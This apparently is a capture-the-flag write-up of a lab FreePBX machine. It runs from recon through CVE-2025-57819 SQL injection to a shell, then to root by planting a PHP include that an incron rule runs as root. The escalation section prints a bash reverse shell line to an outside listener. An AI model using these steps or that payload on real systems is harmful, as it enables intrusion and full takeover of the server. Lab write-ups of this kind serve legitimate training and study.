# Connected

## Recon

### Full Port Scan

```shell
sudo nmap -sT --min-rate 10000 -p- 10.129.17.216 -oA nmapscan/ports
```

```
Nmap scan report for 10.129.17.216
Host is up (0.025s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### Service Detection

```shell
sudo nmap -sT -sC -sV -O -p22,80,443 10.129.17.216 -oA nmapscan/detail
```

```
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
```

Port 80 redirects to `connected.htb`, so add it to `/etc/hosts`:

```shell
echo "10.129.17.216 connected.htb" | sudo tee -a /etc/hosts
```

## Foothold: FreePBX SQL Injection

Browse to `connected.htb`. It is a FreePBX page, version **16.0.40.7**, which is vulnerable to **CVE-2025-57819** (unauthenticated SQLi leading to RCE).

![](assets/Pasted%20image%2020260617132735.png)

Run the public PoC

```
$ python3 exploit.py http://connected.htb
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
...

[asterisk@connected ~]$ whoami
asterisk
```

This gives a shell as the `asterisk` user. Read the user flag.

![](assets/Pasted%20image%2020260617133146.png)

## Privilege Escalation: incron Hook Hijack

The usual checks (`sudo -l`, SUID binaries, crontab) lead nowhere. The interesting attack surface here is **incron**, which triggers commands on filesystem events. List the incron rules:

```
[asterisk@connected ~]$ cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
```

incron rules are run by **root**. The rule that matters is:

```
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

This means: whenever the file `/usr/local/asterisk/ha_trigger` is written and closed, root runs `/usr/sbin/sysadmin_ha`. Check the permissions on both:

```shell
[asterisk@connected ~]$ ls -la /usr/local/asterisk/ha_trigger
-rwxrwxrwx. 1 asterisk asterisk 0 Apr 15  2021 /usr/local/asterisk/ha_trigger

[asterisk@connected ~]$ ls -la /usr/sbin/sysadmin_ha
-rwxr-xr-x. 1 root root 331 Apr 15  2021 /usr/sbin/sysadmin_ha
```

`ha_trigger` is world-writable, so we can fire the trigger. `sysadmin_ha` is owned by root and runs as root. We cannot edit `sysadmin_ha` itself, but we can control what it does. Look at its contents:

```php
[asterisk@connected ~]$ cat /usr/sbin/sysadmin_ha
#!/usr/bin/php -q
<?php

if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
	require_once($i);
	$incron = new incron;
	$incron->rootTrigger();
```

The script blindly `require_once` s `/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php` if it exists, with no signature or integrity check. That path does not exist yet:

```
[asterisk@connected ~]$ ls -la /var/www/html/admin/modules/freepbx_ha/license.php
ls: cannot access /var/www/html/admin/modules/freepbx_ha/license.php: No such file or directory
```

So we can plant our own `incron.php`, and root will execute it for us. Since `asterisk` owns the web root, we have write access to create it.

### Exploitation

Start a listener:

```shell
rlwrap ncat -nvlp 9001
```

Create the malicious include with a reverse shell payload:

```shell
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc
cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php <<'EOF'
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.15.172/9001 0>&1'");
EOF
```

Trigger the incron rule by writing to `ha_trigger`:

```shell
echo x > /usr/local/asterisk/ha_trigger
```

The `IN_CLOSE_WRITE` event fires, root runs `sysadmin_ha`, which includes our `incron.php`, and we catch a root shell on the listener:

```
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
...

[root@connected /]# whoami
root
```

Read the root flag.

![](assets/Pasted%20image%2020260617141422.png)

## Summary

- **Foothold:** Unauthenticated SQLi to RCE in FreePBX 16.0.40.7 (CVE-2025-57819), giving a shell as `asterisk`.
- **Privesc:** An incron rule runs `/usr/sbin/sysadmin_ha` as root whenever the world-writable `/usr/local/asterisk/ha_trigger` is modified. `sysadmin_ha` includes a PHP file from the web root without any integrity check, and `asterisk` can write there. Plant a malicious `incron.php`, touch the trigger, and root executes the payload.